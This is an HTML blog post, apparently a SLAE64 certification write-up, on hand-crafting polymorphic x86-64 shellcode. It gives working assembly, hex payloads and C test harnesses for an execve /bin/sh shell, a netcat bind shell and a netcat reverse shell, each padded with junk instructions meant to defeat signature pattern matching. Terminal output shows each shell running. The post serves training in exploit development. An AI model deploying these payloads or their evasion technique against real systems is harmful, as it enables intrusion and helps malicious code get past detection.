@@ -1,0 +1,399 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE64 - Assignment 6 - Polymorphic Shellcode" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE64-Polymorphic/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE64-Polymorphic/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-27T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE64 - Assignment 6 - Polymorphic Shellcode" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-27T05:44:00+00:00","datePublished":"2021-01-27T05:44:00+00:00","description":"Introduction","headline":"SLAE64 - Assignment 6 - Polymorphic Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE64-Polymorphic/"},"url":"https://whitecr0wz.github.io/posts/SLAE64-Polymorphic/"}</script><title>SLAE64 - Assignment 6 - Polymorphic Shellcode | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE64 - Assignment 6 - Polymorphic Shellcode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE64 - Assignment 6 - Polymorphic Shellcode</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1611726240" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 27, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1462 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h4 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.</p><p>According to wikipedia, “Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations.”. This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.</p><p>Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands!</p><p>The sixth assignment from the seven requires taking three <a href="https://es.wikipedia.org/wiki/Shellcode">shellcodes</a> from <a href="http://shell-storm.org/">shell-storm.org</a> and generate polymorphic versions of such. In addition, its size should not be bigger than 150%.</p><h4 id="execve-shellcode-shellcode-1"><span class="mr-2">Execve Shellcode (Shellcode #1)</span><a href="#execve-shellcode-shellcode-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first shellcode from the three will be one that executes <code class="language-plaintext highlighter-rouge">/bin/sh</code> through the <code class="language-plaintext highlighter-rouge">execve</code> syscall. It can be found <a href="http://shell-storm.org/shellcode/files/shellcode-603.php">here</a>.</p><h6 id="original-code">Original code</h6><pre><code class="language-term">    section .text
+            global _start
+ 
+    _start:
+            xor     rdx, rdx
+            mov     qword rbx, '//bin/sh'
+            shr     rbx, 0x8
+            push    rbx
+            mov     rdi, rsp
+            push    rax
+            push    rdi
+            mov     rsi, rsp
+            mov     al, 0x3b
+            syscall
+</code></pre><p>There are infinite ways to modify such shellcode. For instance, “NOP equivalents” could be used, which add no functionality whatsoever and difficult pattern matching.</p><h6 id="final-code">Final code:</h6><pre><code class="language-term">global _start
+
+_start:
+
+            cmc                              ; Garbage NOP
+            cdq                              ; Garbage NOP
+
+            mov     qword rbx, '//bin/sh'
+            shr     rbx, 0x8
+            xor rsi, rsi                     ; Garbage NOP
+            clc                              ; Garbage NOP
+            push    rbx
+            mov     rdi, rsp
+
+            dec rbp                          ; Garbage NOP
+
+            push    rax
+            mul rbp                          ; Garbage NOP
+            push    rdi
+
+            lea r10, [rsi - 62]              ; Garbage NOP
+
+            mov     rsi, rsp
+
+            mul r12                          ; Garbage NOP
+
+            lea r9, [rbp + 9]                ; Garbage NOP
+
+            mov cl, 27                       ; Garbage NOP
+
+            push word 0x20                   ; Pushes 0x20 into the stack.
+            pop bx                           ; Pops this value into BX.
+
+            mov al, bl                       ; The value in BL is copied into AL.
+            add al, 0x1b                     ; As the value of AL is now 0x20, adding 0x1B will set its value to 0x3B, which is the execve syscall value.
+
+            syscall
+</code></pre><p>Let’s dump the shellcode and test it!</p><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo 
+\xf5\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x31\xf6\xf8\x53\x48\x89\xe7\x48\xff\xcd\x50\x48\xf7\xe5\x57\x4c\x8d\x56\xc2\x48\x89\xe6\x49\xf7\xe4\x4c\x8d\x4d\x09\xb1\x1b\x66\x6a\x20\x66\x5b\x88\xd8\x04\x1b\x0f\x05
+</code></pre><h6 id="c-format">C format</h6><pre><code class="language-term">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+"\xf5\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x31\xf6\xf8\x53\x48\x89\xe7\x48\xff\xcd\x50\x48\xf7\xe5\x57\x4c\x8d\x56\xc2\x48\x89\xe6\x49\xf7\xe4\x4c\x8d\x4d\x09\xb1\x1b\x66\x6a\x20\x66\x5b\x88\xd8\x04\x1b\x0f\x05"
+
+;
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+</code></pre><h4 id="endgame-1"><span class="mr-2">EndGame #1</span><a href="#endgame-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ gcc 1_shellcode.c -o 1_shellcode -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ ./1_shellcode 
+Shellcode Length:  59
+$
+</code></pre><p>Original size: 30 Final size: 59</p><p>Increment: 97%</p><h4 id="netcat-bind-shell-shellcode-2"><span class="mr-2">Netcat Bind-Shell (Shellcode #2)</span><a href="#netcat-bind-shell-shellcode-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The second shellcode from the three will perform a bind-shell in port 1337 through the use of the tool <code class="language-plaintext highlighter-rouge">netcat</code>. It can be found <a href="http://shell-storm.org/shellcode/files/shellcode-822.php">here</a>.</p><h6 id="original-code-1">Original code:</h6><pre><code class="language-term">xor    	rdx,rdx
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+push 	rcx
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+shr	rbx,0x30
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+mov	r9,0x702dffffffffffff
+shr	r9,0x30
+push 	r9
+mov	r9,rsp
+
+mov 	r8,0x6c2dffffffffffff
+shr	r8,0x30
+push 	r8
+mov	r8,rsp
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+push	rbx  ;push address of '-e'
+push	r10  ;push address of '1337'
+push	r9   ;push address of '-p'
+push	r8   ;push address of '-l'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+mov    	al,59
+syscall
+</code></pre><p>There aren’t many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode.</p><h6 id="final-code-1">Final code:</h6><pre><code class="language-term">global _start
+
+_start:
+
+xor rdx, rdx
+
+inc al                                        ; Garbage NOP
+inc cl                                        ; Garbage NOP
+
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+stc                                           ; Garbage NOP
+push 	rcx
+
+nop                                           ; Garbage NOP
+nop                                           ; Garbage NOP
+
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+
+shr al, 2                                     ; Garbage NOP
+
+shr	rbx,0x30
+cdq                                           ; Garbage NOP
+nop                                           ; Garbage NOP
+cmc                                           ; Garbage NOP
+
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+
+push r15                                      ; Garbage NOP
+pop r14                                       ; Garbage NOP
+push r15                                      ; Garbage NOP
+pop r14                                       ; Garbage NOP
+
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+mov	r9,0x702dffffffffffff
+shr	r9,0x30
+push 	r9
+mov	r9,rsp
+
+mov 	r8,0x6c2dffffffffffff
+shr	r8,0x30
+
+loop:
+
+rol rbp, 59                                   ; Garbage NOP
+ror r14, 60                                   ; Garbage NOP
+shr r13, 8                                    ; Garbage NOP
+
+push 	r8
+mov	r8,rsp
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+
+push	rbx  ;push address of '-e'
+push	r10  ;push address of '1337'
+
+nop                                          ; Garbage NOP
+stc                                          ; Garbage NOP
+lea r12, [rsp - 0xFF]                        ; Garbage NOP
+nop                                          ; Garbage NOP
+
+cld                                          ; Garbage NOP
+nop                                          ; Garbage NOP
+
+push	r9   ;push address of '-p'
+push	r8   ;push address of '-l'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+
+stc                                          ; Garbage NOP
+cmc                                          ; Garbage NOP
+push rsp                                     ; Garbage NOP
+pop r14                                      ; Garbage NOP
+push r15                                     ; Garbage NOP
+pop rax                                      ; Garbage NOP
+
+mov    	al, 0x0c                             ; Gives AL the value 0C.
+add     al, 0x2f                             ; Adds AL with 2F, this will grant AL the value 3B, which is the syscall number for execve.
+
+syscall
+</code></pre><p>Let’s test this shellcode once again.</p><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+</code></pre><h6 id="c-format-1">C format</h6><pre><code class="language-term">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+"\x48\x31\xd2\xfe\xc0\xfe\xc1\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xf9\x51\x90\x90\x48
+\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xc0\xe8\x02\x48\xc1\xeb\x30\x99\x90\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x41\x57\x41\x5e\x41\x57\x41\x5e\
+x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d\x6c\x49\xc1\xe8\x30\x48\xc1\x
+c5\x3b\x49\xc1\xce\x3c\x49\xc1\xed\x08\x41\x50\x49\x89\xe0\x52\x51\x53\x41\x52\x90\xf9\x4c\x8d\xa4\x24\x01\xff\xff\xff\x90\xfc\x90\x41\x51\x41\x50\x57\x48\x89\xe6\xf9\xf5\x54\x4
+1\x5e\x41\x57\x58\xb0\x0c\x04\x2f\x0f\x05"
+
+;
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+</code></pre><h4 id="endgame-2"><span class="mr-2">EndGame #2</span><a href="#endgame-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ gcc 2_shellcode.c -o 2_shellcode -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ ./2_shellcode 
+Shellcode Length:  187
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+root@whitecr0wz:~# rlwrap nc 192.168.100.205 1337 -v 
+192.168.100.205: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.100.205] 1337 (?) open
+python -c 'import pty;pty.spawn("/bin/bash")'; 
+&lt;0wz/assembly/assignments/Assignment_6/2_shellcode$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+&lt;0wz/assembly/assignments/Assignment_6/2_shellcode$
+</code></pre><p>Original size: 131 Final size: 187</p><p>Increment: 43%</p><h4 id="reverse-shell-shellcode-shellcode-3"><span class="mr-2">Reverse-shell Shellcode (Shellcode #3)</span><a href="#reverse-shell-shellcode-shellcode-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>For the final shellcode, I have chosen to use a reverse-shell that arranges a connection towards the localhost on port 1337. It can be found <a href="http://shell-storm.org/shellcode/files/shellcode-823.php">here</a>.</p><h6 id="original-code-2">Original code:</h6><pre><code class="language-term">xor    	rdx,rdx
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+push 	rcx
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+shr	rbx,0x30
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+jmp short ip
+continue:
+pop 	r9
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+push	rbx  ;push address of '-e'
+push	r10  ;push address of '1337'
+push	r9   ;push address of 'ip'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+mov    	al,59
+syscall
+
+
+ip:
+	call  continue
+	db "127.0.0.1"
+</code></pre><p>Once again, there isn’t much to comment, other than the fact that we can apply the aforementioned polymorphic techniques against this shellcode.</p><h6 id="final-code-2">Final code:</h6><pre><code class="language-term">global _start
+
+_start:
+
+xor    	rdx,rdx
+nop                                                 ; Garbage NOP
+nop                                                 ; Garbage NOP
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+dec al                                              ; Garbage NOP
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+dec al                                              ; Garbage NOP
+
+
+push 	rcx
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+std                                                 ; Garbage NOP
+cwd                                                 ; Garbage NOP
+shr	rbx,0x30
+
+cmc                                                 ; Garbage NOP
+
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+std                                                 ; Garbage NOP
+push 	r10
+mov	r10,rsp
+
+jmp short ip
+continue:
+pop 	r9
+
+push	rdx  ;push NULL
+
+push 	rcx  ;push address of 'bin/sh'
+nop                                                 ; Garbage NOP
+inc dl                                              ; Garbage NOP  
+dec dl                                              ; Garbage NOP
+
+push	rbx  ;push address of '-e'
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
+nop                                                 ; Garbage NOP
+push	r10  ;push address of '1337'
+
+dec al                                              ; Garbage NOP
+
+push	r9   ;push address of 'ip'
+
+inc bl                                              ; Garbage NOP
+dec bl                                              ; Garbage NOP
+
+push 	rdi  ;push address of '/bin/nc'
+
+nop                                                 ; Garbage NOP
+mov    	rsi,rsp
+mov al, 59
+
+syscall
+
+ip:
+	call  continue
+	db "127.0.0.1"
+</code></pre><p>Let’s assemble, link, and test this shellcode.</p><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+</code></pre><h6 id="c-format-2">C format</h6><pre><code class="language-term">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+"\x48\x31\xd2\x90\x90\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\xfe\xc8\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xfe\xc8\x51\xfe\xc1
+\xfe\xc9\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xfd\x66\x99\x48\xc1\xeb\x30\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\xfd\x41\x52\
+x49\x89\xe2\xeb\x22\x41\x59\x52\x51\x90\xfe\xc2\xfe\xca\x53\xfe\xc1\xfe\xc9\x90\x41\x52\xfe\xc8\x41\x51\xfe\xc3\xfe\xcb\x57\x90\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xd9\xff\xff\xff\x
+31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
+
+;
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+</code></pre><h4 id="endgame-3"><span class="mr-2">EndGame #3</span><a href="#endgame-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ gcc 3_shellcode.c -o 3_shellcode -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ ./3_shellcode 
+Shellcode Length:  141
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+whitecr0wz@SLAE64:~$ rlwrap nc -lvp 1337 
+listening on [any] 1337 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 55804
+python -c 'import pty;pty.spawn("/bin/bash")';
+&lt;0wz/assembly/assignments/Assignment_6/3_shellcode$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+&lt;0wz/assembly/assignments/Assignment_6/3_shellcode$
+</code></pre><p>Original size: 109 Final size: 141</p><p>Increment: 30%</p><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE64-27812/PA-27812</p><p>You can find all of the used resources within this post <a href="https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_6">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae64/'>SLAE64</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE64+-+Assignment+6+-+Polymorphic+Shellcode+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Polymorphic%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE64+-+Assignment+6+-+Polymorphic+Shellcode+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Polymorphic%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Polymorphic%2F&text=SLAE64+-+Assignment+6+-+Polymorphic+Shellcode+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Alignments-on-windows-registers/"><div class="card-body"> <em class="small" data-ts="1612158240" data-df="ll" > Feb 1, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Alignments on Windows Registers</h3><div class="text-muted small"><p> Preamble Welcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Expl...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnserver-LTER/"><div class="card-body"> <em class="small" data-ts="1612244640" data-df="ll" > Feb 2, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnserver LTER - SEH Extremely restricted character set</h3><div class="text-muted small"><p> Introduction Last time i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the vulnerable server by stephen bradshaw, in which, a res...</p></div></div></a></div><div class="card"> <a href="/posts/Backdooring-PE/"><div class="card-body"> <em class="small" data-ts="1603172640" data-df="ll" > Oct 20, 2020 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdooring PE Files through Code Caves</h3><div class="text-muted small"><p> Introduction Building malware is a topic which has always been from great interest to me. However, injecting malicious code within benign software seems a very concerning yet engrossing concept. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE64-Analyzing-Shellcode/" class="btn btn-outline-primary" prompt="Older"><p>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</p></a> <a href="/posts/Custom-Crypter/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE64 - Assignment 7 - Custom Crypter</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" 